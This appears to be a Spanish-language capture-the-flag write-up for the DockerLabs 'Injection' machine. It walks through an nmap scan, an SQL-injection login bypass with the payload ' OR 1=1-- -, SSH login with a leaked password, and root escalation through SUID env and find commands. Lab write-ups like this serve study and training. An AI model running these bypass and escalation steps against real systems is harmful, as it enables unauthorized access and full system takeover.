# 🖥️ Injection - DockerLabs

> **Dificultad:** Media  
> **OS:** Ubuntu  
> **IP:** 172.17.0.2  
> **Fecha:** 2026-04-13

---

## 📡 Reconocimiento

```bash
sudo nmap -p- -sS -sC -sV --min-rate 5000 -n -vv -Pn 172.17.0.2
```

**Puertos abiertos:**
| Puerto | Servicio | Versión |
|--------|----------|---------|
| 22/tcp | SSH | OpenSSH 8.9p1 Ubuntu |
| 80/tcp | HTTP | Apache 2.4.52 (Ubuntu) |

- Puerto 80 muestra directamente un formulario de login
- Cookie `PHPSESSID` sin flag `httponly` → señal de aplicación PHP vulnerable

---

## 🔓 SQL Injection — Bypass de autenticación

Formulario POST con campos `name` y `password`.

**Payload en el campo usuario:**
```
' OR 1=1-- -
```

**Contraseña:** cualquiera

**Respuesta:** `Bienvenido Dylan! Has insertado correctamente tu contraseña: KJSDFG789FGSDF78`

> El payload cierra la query SQL y añade una condición siempre verdadera, devolviendo el primer usuario de la DB

---

## 🔑 Acceso inicial — SSH

```bash
ssh dylan@172.17.0.2
# password: KJSDFG789FGSDF78
```

---

## ⬆️ Escalada de privilegios — SUID

```bash
find / -perm -4000 2>/dev/null
```

**SUID encontrados relevantes:**
- `/usr/bin/env`
- `/usr/bin/find`

**Método 1 — env (GTFOBins):**
```bash
/usr/bin/env /bin/bash -p
```

**Método 2 — find (GTFOBins):**
```bash
find . -exec /bin/bash -p \; -quit
```

Ambos dan shell como `root`.

---

## 📝 Lecciones aprendidas

- ⭐ Cookie sin `httponly` en nmap = aplicación web vulnerable, investigar SQLi
- **`' OR 1=1-- -`** es el payload más básico de SQLi para bypass de login
- La aplicación devuelve credenciales reales de la DB — mala práctica de desarrollo
- **env y find con SUID** = escalada trivial, siempre buscar en GTFOBins
- Sin `sudo` disponible, los binarios SUID son el siguiente vector a revisar
